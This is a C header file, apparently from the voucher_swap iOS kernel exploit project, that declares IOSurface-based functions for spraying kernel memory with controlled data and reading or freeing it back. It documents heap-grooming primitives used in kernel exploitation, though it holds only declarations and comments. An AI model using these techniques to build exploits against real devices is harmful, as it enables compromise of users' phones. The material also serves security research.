/*
 * iosurface.h
 * Brandon Azad
 */
#ifndef VOUCHER_SWAP__IOSURFACE_H_
#define VOUCHER_SWAP__IOSURFACE_H_

#include <mach/mach.h>
#include <stdbool.h>
#include <stddef.h>

#ifdef IOSURFACE_EXTERN
#define extern IOSURFACE_EXTERN
#endif

// The IOSurfaceRoot service.
extern mach_port_t IOSurfaceRoot;

// An IOSurfaceRootUserClient instance.
extern mach_port_t IOSurfaceRootUserClient;

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

/*
 * IOSurface_init
 *
 * Description:
 * 	Initialize the IOSurface subsystem.
 */
bool IOSurface_init(void);

/*
 * IOSurface_deinit
 *
 * Description:
 * 	Tear down the IOSurface subsystem. Any sprayed memory will be automatically deallocated.
 */
void IOSurface_deinit(void);

// This value encodes to 0x00ffffff, so any larger value will cause IOSurface_property_key() to
// wrap and collide with a smaller value.
#define MAX_IOSURFACE_PROPERTY_INDEX	(0x00fd02fe)

/*
 * IOSurface_property_key
 *
 * Description:
 * 	Get the property key for the specified IOSurface property index. The property key is a
 * 	32-bit value that can be used as a 3-character, null-terminated OSSymbol: the top byte of
 * 	the value is zero, so when written to memory as a little-endian 32-bit integer, it will
 * 	consist of 3 non-zero bytes followed by a null terminator.
 */
uint32_t IOSurface_property_key(uint32_t property_index);

/*
 * IOSurface_remove_property
 *
 * Description:
 * 	Remove a property from the IOSurface, releasing associated resources.
 */
bool IOSurface_remove_property(uint32_t property_key);

/*
 * IOSurface_kalloc_fast
 *
 * Description:
 * 	Allocate a large, mostly bzero'd kalloc allocation of the specified size under the
 * 	specified IOSurface property.
 *
 * 	The allocation is performed by setting the property corresponding to property_key to be
 * 	an OSDictionary of large capacity. The maximum size that can be allocated in this way is
 * 	256 MB.
 */
bool IOSurface_kalloc_fast(uint32_t property_key, size_t kalloc_size);

/*
 * IOSurface_kmem_alloc_fast_buffer_size
 *
 * Description:
 * 	Returns the size of preallocated buffer needed to allocate a block of controlled memory of
 * 	size kmem_alloc_size in the kernel using IOSurface_kmem_alloc_fast().
 */
size_t IOSurface_kmem_alloc_fast_buffer_size(size_t kmem_alloc_size);

/*
 * IOSurface_kmem_alloc_fast_prepare
 *
 * Description:
 * 	Prepare a buffer to perform a kmem_alloc() allocation using IOSurface_kmem_alloc_fast().
 */
bool IOSurface_kmem_alloc_fast_prepare(
		size_t kmem_alloc_size,
		void *kmem_alloc_fast_buffer,
		size_t *kmem_alloc_fast_buffer_size,
		void (^initialize_data)(void *data));

/*
 * IOSurface_kmem_alloc_fast
 *
 * Description:
 * 	Allocate a large block of controlled data using kmem_alloc() under the specified IOSurface
 * 	property, using the specified buffer prepared with IOSurface_kmem_alloc_fast_prepare().
 *
 * 	The allocation is performed by setting the property corresponding to property_key to be an
 * 	OSData object. The maximum size that can be allocated in this way is 0xffffff bytes (1 byte
 * 	less than 16 MB).
 *
 * Parameters:
 * 	property_key			The key of the IOSurface property under which the
 * 					allocation is stored.
 * 	kmem_alloc_fast_buffer		A buffer initialized with
 * 					IOSurface_kmem_alloc_fast_prepare().
 * 	kmem_alloc_fast_buffer_size	The size of the buffer, as returned by
 * 					IOSurface_kmem_alloc_fast_prepare().
 */
bool IOSurface_kmem_alloc_fast(uint32_t property_key,
		void *kmem_alloc_fast_buffer, size_t kmem_alloc_fast_buffer_size);

/*
 * IOSurface_kmem_alloc_array_fast_buffer_size
 *
 * Description:
 * 	Returns the size of preallocated buffer needed to allocate kmem_alloc_count blocks of
 * 	controlled memory of size kmem_alloc_size in the kernel using
 * 	IOSurface_kmem_alloc_array_fast().
 */
size_t IOSurface_kmem_alloc_array_fast_buffer_size(size_t kmem_alloc_size,
		size_t kmem_alloc_count);

/*
 * IOSurface_kmem_alloc_array_fast_prepare
 *
 * Description:
 * 	Given a buffer of size IOSurface_kmem_alloc_array_fast_buffer_size() that is to be passed
 * 	to IOSurface_kmem_alloc_array_fast(), return a pointer to the data region at which the
 * 	controlled data for the specified index can be written inside the buffer.
 *
 * Parameters:
 * 	kmem_alloc_size			The size of each kmem_alloc() allocation.
 * 	kmem_alloc_count		The number of allocations to make.
 */
bool IOSurface_kmem_alloc_array_fast_prepare(
		size_t kmem_alloc_size,
		size_t kmem_alloc_count,
		void *kmem_alloc_array_fast_buffer,
		size_t *kmem_alloc_array_fast_buffer_size,
		void (^initialize_data)(void *data, size_t index));

/*
 * IOSurface_kmem_alloc_array_fast
 *
 * Description:
 * 	Allocate a number of large blocks of controlled data using kmem_alloc() under the specified
 * 	IOSurface property, using a preallocated userspace buffer to speed construction.
 *
 * 	The allocation is performed by setting the property corresponding to property_key to be an
 * 	OSArray of OSData objects. The maximum size of each kmem_alloc() allocation is 0xffffff
 * 	bytes (1 byte less than 16 MB).
 *
 * Parameters:
 * 	property_key			The key of the IOSurface property under which the
 * 					allocations are stored.
 * 	kmem_alloc_array_fast_buffer	A buffer initialized with
 * 					IOSurface_kmem_alloc_array_fast_prepare().
 * 	kmem_alloc_array_fast_buffer_size	The size of the buffer, as returned by
 * 					IOSurface_kmem_alloc_array_fast_prepare().
 */
bool IOSurface_kmem_alloc_array_fast(uint32_t property_key,
		void *kmem_alloc_array_fast_buffer, size_t kmem_alloc_array_fast_buffer_size);

// ---- Convenience API ---------------------------------------------------------------------------

/*
 * IOSurface_kmem_alloc_array_fast_prepare_
 *
 * Description:
 * 	Prepare the buffer for an IOSurface kmem_alloc() spray. To be used with
 * 	IOSurface_kmem_alloc_array_fast().
 */
bool IOSurface_kmem_alloc_array_fast_prepare_(
		size_t kmem_alloc_size,
		size_t spray_size,
		void *kmem_alloc_array_fast_buffer,
		size_t *kmem_alloc_array_fast_buffer_size,
		void (^initialize_data)(void *data, size_t index));

/*
 * IOSurface_spray_with_gc
 *
 * Description:
 * 	Spray kernel memory using IOSurface properties.
 *
 * 	The current implementation stores each data allocation in an OSString. The reason for this
 * 	is that OSString contents will be allocated using kalloc() even for allocations larger than
 * 	the page size. OSData on the other hand will use kmem_alloc() for large allocations.
 * 	Consequently, the last byte of data will be zeroed out to create a null terminator.
 */
bool IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
    void* data, uint32_t data_size,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size));

/*
 * IOSurface_spray_size_with_gc
 *
 * Description:
 * 	Spray kernel memory using IOSurface properties.
 *
 * 	This function computes the number of elements per array automatically.
 */
bool IOSurface_spray_size_with_gc(uint32_t array_count, size_t spray_size,
    void* data, uint32_t data_size,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size));

/*
 * IOSurface_spray_read_array
 *
 * Description:
 * 	Read back the data elements in a particular array in a particular IOSurface spray.
 */
bool IOSurface_spray_read_array(uint32_t array_id, uint32_t array_length, uint32_t data_size,
    void (^callback)(uint32_t data_id, void* data, size_t size));

/*
 * IOSurface_spray_read_all_data
 *
 * Description:
 * 	Read back all the data elements in an IOSurface spray.
 */
bool IOSurface_spray_read_all_data(uint32_t array_count, uint32_t array_length, uint32_t data_size,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size));

/*
 * IOSurface_spray_remove_array
 *
 * Description:
 * 	Remove a particular array from an IOSurface spray, freeing the contained data elements.
 */
bool IOSurface_spray_remove_array(uint32_t array_id);

/*
 * IOSurface_spray_clear
 *
 * Description:
 * 	Remove all the arrays from an IOSurface spray, freeing all the data elements.
 */
bool IOSurface_spray_clear(uint32_t array_count);

#undef extern

#endif
